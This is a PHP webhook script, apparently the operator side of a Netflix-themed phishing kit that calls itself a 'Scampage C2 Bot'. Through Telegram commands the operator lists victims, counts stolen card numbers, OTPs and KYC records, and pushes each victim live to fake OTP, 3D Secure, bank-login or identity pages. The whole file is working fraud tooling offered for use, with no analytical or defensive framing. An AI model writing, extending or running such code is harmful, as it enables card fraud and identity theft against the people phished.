<?php
require_once 'db.php';

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!isset($data['callback_query'])) {
    // Handle regular messages too
    if (isset($data['message'])) {
        $chat_id = $data['message']['chat']['id'];
        $text = $data['message']['text'] ?? '';

        if ($text === '/start' || $text === '/help') {
            $msg = "🎬 <b>Netflix Scampage C2 Bot</b>

";
            $msg .= "Commands:
";
            $msg .= "/start - Show this help
";
            $msg .= "/victims - List active victims
";
            $msg .= "/stats - Show statistics

";
            $msg .= "When a victim submits data, you will receive it here with control buttons.";
            sendMessage($chat_id, $msg);
        }
        elseif ($text === '/victims') {
            $db = new SQLite3('victims.db');
            $result = $db->query("SELECT session_id, email, status, created_at FROM victims ORDER BY updated_at DESC LIMIT 10");
            $msg = "🎯 <b>Recent Victims:</b>

";
            $count = 0;
            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $count++;
                $msg .= $count . ". <code>" . substr($row['session_id'], 0, 12) . "...</code>
";
                $msg .= "   📧 " . ($row['email'] ?: 'N/A') . "
";
                $msg .= "   📍 Status: " . $row['status'] . "
";
                $msg .= "   🕐 " . $row['created_at'] . "

";
            }
            if ($count === 0) $msg .= "No victims yet.";
            sendMessage($chat_id, $msg);
        }
        elseif ($text === '/stats') {
            $db = new SQLite3('victims.db');
            $total = $db->querySingle("SELECT COUNT(*) FROM victims");
            $withCC = $db->querySingle("SELECT COUNT(*) FROM victims WHERE cc_num != ''");
            $withOTP = $db->querySingle("SELECT COUNT(*) FROM victims WHERE otp != ''");
            $withKYC = $db->querySingle("SELECT COUNT(*) FROM victims WHERE kyc_name != ''");

            $msg = "📊 <b>Statistics</b>

";
            $msg .= "👥 Total Victims: " . $total . "
";
            $msg .= "💳 With CC: " . $withCC . "
";
            $msg .= "📱 With OTP: " . $withOTP . "
";
            $msg .= "🆔 With KYC: " . $withKYC . "
";
            sendMessage($chat_id, $msg);
        }
    }
    http_response_code(200);
    exit;
}

$callback = $data['callback_query'];
$chat_id = $callback['message']['chat']['id'];
$message_id = $callback['message']['message_id'];
$data_btn = $callback['data'];

// Parse callback data: action_sessionid
$parts = explode('_', $data_btn, 2);
$action = $parts[0];
$session_id = $parts[1] ?? '';

if (!$session_id) {
    answerCallback($callback['id'], '❌ Error: Invalid session');
    exit;
}

$victim = getVictim($session_id);
if (!$victim) {
    answerCallback($callback['id'], '❌ Victim not found');
    exit;
}

$next_pages = [
    'otp' => 'otp',
    'otp2' => 'otp2',
    'approval' => 'approval',
    'bank' => 'bank',
    'kyc' => 'kyc',
    'done' => 'done'
];

if (isset($next_pages[$action])) {
    updateVictim($session_id, [
        'next_step' => $next_pages[$action],
        'admin_choice' => $action
    ]);

    $labels = [
        'otp' => 'OTP/SMS page',
        'otp2' => 'OTP 2 page',
        'approval' => '3D Secure page',
        'bank' => 'Bank Login page',
        'kyc' => 'KYC page',
        'done' => 'Done/Finish'
    ];

    answerCallback($callback['id'], "✅ Sent victim to " . $labels[$action]);

    $new_text = $callback['message']['text'] . "

✅ <b>Admin chose:</b> " . $labels[$action] . "
⏳ <i>Victim redirecting...</i>";
    editMessage($chat_id, $message_id, $new_text);
} else {
    answerCallback($callback['id'], '❌ Unknown action');
}

function answerCallback($callback_id, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery";
    $data = ['callback_query_id' => $callback_id, 'text' => $text, 'show_alert' => false];
    file_get_contents($url . '?' . http_build_query($data));
}

function editMessage($chat_id, $message_id, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/editMessageText";
    $data = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    file_get_contents($url . '?' . http_build_query($data));
}

function sendMessage($chat_id, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    file_get_contents($url . '?' . http_build_query($data));
}
?>
